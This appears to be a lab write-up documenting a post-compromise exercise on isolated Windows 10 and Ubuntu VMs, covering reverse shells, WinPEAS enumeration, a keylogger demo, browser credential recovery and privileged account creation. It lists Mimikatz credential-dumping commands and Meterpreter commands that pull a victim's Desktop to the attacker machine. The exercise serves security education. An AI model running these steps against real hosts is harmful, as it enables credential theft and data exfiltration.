# II.4 – Post-Compromise Operations on Compromised Hosts

> 📚 **Cybersecurity Laboratory Documentation**  
> A controlled post-compromise exercise demonstrating attacker operations after initial access on Windows and Linux systems.

---

## 📖 Table of Contents

- [Overview](#overview)
- [⚠️ Lab Safety Disclaimer](#️-lab-safety-disclaimer)
- [🏗 Lab Architecture](#-lab-architecture)
- [🎯 Objectives](#-objectives)
  - [Windows Post-Compromise Operations](#windows-post-compromise-operations)
  - [Linux Post-Compromise Operations](#linux-post-compromise-operations)
- [🔄 Attack Flow](#-attack-flow)
- [🛠 Tools Used](#-tools-used)
- [📝 Lab Procedures](#-lab-procedures)
  - [1. Windows Reverse Shell](#1-windows-reverse-shell)
  - [2. Windows Reconnaissance](#2-windows-reconnaissance)
  - [3. WinPEAS Enumeration](#3-winpeas-enumeration)
  - [4. Keylogging Demonstration](#4-keylogging-demonstration)
  - [5. Credential Dumping with Mimikatz](#5-credential-dumping-with-mimikatz)
  - [6. Document Discovery and Collection](#6-document-discovery-and-collection)
  - [7. Browser Credential-Recovery Test](#7-browser-credential-recovery-test)
- [🖼 Evidence Screenshots](#-evidence-screenshots)
- [💡 Lessons Learned](#-lessons-learned)
- [🔒 Security Considerations](#-security-considerations)
- [📜 Legal Disclaimer](#-legal-disclaimer)

---

## Overview

This repository documents a **controlled post-compromise laboratory exercise** performed against Windows 10 and Linux systems in an isolated virtual environment.

The objective of this exercise was to demonstrate how an attacker can operate after obtaining remote command execution on a compromised host through a reverse shell and malicious payload.

The lab covers:

- ✅ Windows host reconnaissance
- ✅ Document discovery and collection
- ✅ Browser credential-recovery testing
- ✅ Credential dumping with Mimikatz
- ✅ Windows enumeration with WinPEAS
- ✅ Keylogging demonstration
- ✅ Linux host reconnaissance
- ✅ Creation of a root-privileged account
- ✅ Remote command execution through reverse shells

---

## ⚠️ Lab Safety Disclaimer

> **All activities were performed in an isolated VMware laboratory environment** using test systems, dummy credentials, and laboratory-generated files. **No production systems or real credentials were intentionally targeted.**

---

## 🏗 Lab Architecture

```
                          VMware ESXi
                                |
                    Isolated Lab Network
                                |
            +-------------------+-------------------+
            |                   |                   |
            v                   v                   v
       Kali Linux          Windows 10         Ubuntu Server
        Attacker             Victim               Victim
            |                   |                   |
            |                   |                   |
            +------- Reverse Shell Connections -----+
                                |
                        Post-Compromise
```

| System          | Role                                     |
| --------------- | ---------------------------------------- |
| **Kali Linux**  | Attacker / listener / control host       |
| **Windows 10**  | Compromised Windows host                 |
| **Ubuntu Server** | Compromised Linux host                 |

---

## 🎯 Objectives

### Windows Post-Compromise Operations

The following operations were demonstrated on the Windows 10 victim host:

- 🔹 Establish a reverse shell
- 🔹 Perform host reconnaissance
- 🔹 Discover and collect documents
- 🔹 Stage and archive collected files
- 🔹 Test browser credential recovery
- 🔹 Dump Windows credential material using Mimikatz
- 🔹 Enumerate the system using WinPEAS
- 🔹 Demonstrate keylogging using laboratory-only input

### Linux Post-Compromise Operations

The following operations were demonstrated on the Ubuntu Server victim host:

- 🔹 Establish a reverse shell
- 🔹 Perform host reconnaissance
- 🔹 Create a privileged laboratory account
- 🔹 Add the account to the sudo group
- 🔹 Verify root-level administrative access

---

## 🔄 Attack Flow

The laboratory follows a simplified post-compromise workflow:

```
Initial Access
      |
      v
Reverse Shell
      |
      v
Remote Command Execution
      |
      +-----------------------------+
      |                             |
      v                             v
   Windows                        Linux
      |                             |
      +-- Recon                     +-- Recon
      |                             |
      +-- WinPEAS                   +-- Account Creation
      |                             |
      +-- Document Collection       +-- Sudo Privileges
      |
      +-- Browser Credential Test
      |
      +-- Mimikatz
      |
      +-- Keylogging Demonstration
```

---

## 🛠 Tools Used

### Kali Linux (Attacker)
- **Metasploit Framework**
  - `msfconsole`
  - `msfvenom`
- **Netcat**
- Standard Linux utilities

### Windows 10 (Victim)
- **PowerShell**
- **Mimikatz**
- **WinPEAS**
- **LaZagne**
- Browser password manager
- PowerShell-based laboratory keylogging demonstration

### Ubuntu Server (Victim)
- **Bash**
- `useradd`
- `usermod`
- `sudo`
- Standard Linux utilities

---

## 📝 Lab Procedures

### 1. Windows Reverse Shell

The Windows 10 host was configured to establish an outbound reverse-shell connection to the Kali Linux laboratory machine. The reverse shell provided the remote command-execution channel used for the subsequent post-compromise activities.

**Evidence:**
- `![My Screenshot](SCREENSHOTS/msfconsole.png)`
- `msfvenom.png`
- `unzippingmaliciousshell.png`

**Reverse-shell architecture:**
```
Windows 10
     |
     | Outbound TCP connection
     v
Kali Linux Listener
     |
     v
Remote PowerShell Shell
```

---

### 2. Windows Reconnaissance

After establishing remote command execution, reconnaissance was performed to identify information about the compromised system.

**Information collected included:**
- Current username
- Hostname
- Operating system
- IP configuration
- Network information
- Internet connectivity
- Domain information

**Evidence:**
- `sysinfo and ipconfig.png`

> The collected information provides situational awareness about the compromised endpoint and its network environment.

---

### 3. WinPEAS Enumeration

WinPEAS was used to perform broader enumeration of the compromised Windows system.

**Areas of enumeration included:**
- User information
- Group memberships
- Privileges
- Services
- Environment variables
- Network configuration
- Security configuration
- Potential privilege-escalation opportunities

**Evidence:**
- `winPeas Basic info.png`

> WinPEAS complements manual reconnaissance by automating the enumeration of common Windows security and configuration information.

---

### 4. Keylogging Demonstration

A PowerShell-based laboratory keylogging demonstration was used to illustrate how keyboard input can be captured after host compromise. **Only dummy laboratory input was used during testing.**

**Example test input:**
```
test test 123
```

**Evidence:**
- `ps1 script for keylogger.png`
- `windows keylog test.png`
- `keylogs retrieve.png`

**Attack flow:**
```
Compromised Host
      |
      v
Keylogger Execution
      |
      v
Dummy Keyboard Input
      |
      v
Local Test Log
```

> The purpose of the demonstration was to show the security impact of input capture while avoiding the collection of real user credentials.

---

### 5. Credential Dumping with Mimikatz

Mimikatz was executed on the Windows 10 host to demonstrate Windows credential-access operations.

**Example commands used during the laboratory:**
```
privilege::debug
sekurlsa::logonpasswords
```

**Evidence:**
- `mimikatz1.png`
- `mimikatz2.png`

> The laboratory demonstrated that an attacker with sufficient privileges may attempt to access authentication material from a compromised Windows system.
>
> ⚠️ **Important:** Sensitive credential material, password hashes, tokens, and secrets should be **redacted** before publishing screenshots to a public repository.

---

### 6. Document Discovery and Collection

After obtaining a Meterpreter session on the Windows 10 host, the Desktop directory was enumerated to identify files available to the compromised user.

**The Desktop contained laboratory files and directories:**
```
asset files
finance files
desktop.ini
Microsoft Edge.lnk
```

**The Desktop directory was accessed through the Meterpreter session:**
```meterpreter
meterpreter > cd C:\Users\PC1\Desktop
meterpreter > dir
```

**The contents were collected from the compromised host to the Kali Linux machine:**
```meterpreter
meterpreter > download C:\Users\PC1\Desktop /home/butch
```

The Meterpreter output confirmed that the files and directories were successfully downloaded to `/home/butch`.

**Collected data included:**
- `asset files/`
- `finance files/`
- `desktop.ini`
- `Microsoft Edge.lnk`

**Evidence:**
- `extract documents.png`

**Attack flow:**
```
Compromised Windows 10
        |
        v
Meterpreter Session
        |
        v
Desktop Enumeration
        |
        v
File Discovery
        |
        v
Meterpreter Download
        |
        v
Kali Linux
/home/butch
```

---

### 7. Browser Credential-Recovery Test

A dummy account was created specifically for the laboratory.

**Example laboratory credentials:**
```
Username: labuser
Password: [LAB TEST PASSWORD]
```

The credential was saved in the test browser profile and a credential-recovery tool was used to demonstrate the credential-access stage of post-compromise activity.

**Evidence:**
- `chrome password retrieve.png`
- `downloaded and unzipping chromelev.png`
- `executing chromelev.png`
- `chromelev directory confirmed.png`
- `FREE.EXE LINK.png`

**Credential recovery results can vary depending on:**
- Browser version
- Windows version
- User profile
- Execution context
- Browser credential-protection mechanisms

> In this laboratory environment, the credential-recovery attempt did not necessarily result in plaintext credentials being recovered. This demonstrates an important security concept: **credential-access tools do not guarantee successful recovery of protected browser credentials.**

---

## 🖼 Evidence Screenshots

The repository contains screenshots documenting the laboratory activity.

| Screenshot                               | Description                           |
| ---------------------------------------- | ------------------------------------- |
| `msfconsole.png`                         | Metasploit console                    |
| `msfvenom.png`                           | Laboratory payload generation         |
| `unzippingmaliciousshell.png`            | Payload preparation                   |
| `sysinfo and ipconfig.png`               | Windows reconnaissance                |
| `winPeas Basic info.png`                 | WinPEAS enumeration                   |
| `extract documents.png`                  | Document collection                   |
| `chrome password retrieve.png`           | Browser credential-recovery test      |
| `chromelev directory confirmed.png`      | Credential-recovery tool directory    |
| `downloaded and unzipping chromelev.png` | Tool preparation                      |
| `executing chromelev.png`                | Tool execution                        |
| `mimikatz1.png`                          | Mimikatz execution                    |
| `mimikatz2.png`                          | Credential-access results             |
| `ps1 script for keylogger.png`           | Keylogging laboratory script          |
| `windows keylog test.png`                | Keylogging test                       |
| `keylogs retrieve.png`                   | Keylog retrieval                      |
| `phishingemailsample.png`                | Supporting laboratory artifact        |

---

## 💡 Lessons Learned

This laboratory demonstrated that obtaining an initial shell is **only the beginning of a compromise**.

After obtaining remote command execution, an attacker may:

- 🔍 Identify the operating system and network environment
- 👥 Discover users and privileges
- 📁 Search for sensitive documents
- 📦 Collect and stage data
- 🔑 Attempt to recover browser credentials
- 🔐 Attempt to access Windows authentication material
- ⌨️ Monitor user input
- ⚙️ Establish additional privileged accounts

The exercise also demonstrates why the following defensive controls are critical:

- 🛡 Strong endpoint monitoring
- 🔒 Credential protection mechanisms
- 👤 Principle of least privilege
- ⚡ Rapid incident response capabilities

---

## 🔒 Security Considerations

The tools demonstrated in this repository are **dual-use security tools**.

They should **only** be used in:

- ✅ Authorized penetration tests
- ✅ Cybersecurity training laboratories
- ✅ Isolated virtual environments
- ✅ Systems owned or explicitly authorized for testing

**❌ Do NOT use these techniques against systems without authorization.**

**❌ Do NOT commit real passwords, password hashes, tokens, browser credentials, personal information, or other sensitive data to the repository.**

---

## 📜 Legal Disclaimer

> This repository is intended **strictly for cybersecurity education and authorized laboratory testing**.
>
> All activities were performed against controlled laboratory virtual machines. The screenshots and demonstrations are provided for educational purposes and should **not** be interpreted as authorization to perform these activities against third-party systems.
>
> Unauthorized access to computer systems is illegal and unethical. Always obtain explicit written permission before testing any system you do not own.

---

<div align="center">

**📚 Educational Purpose Only • 🔒 Authorized Testing Only • ⚠️ Use Responsibly**

</div>
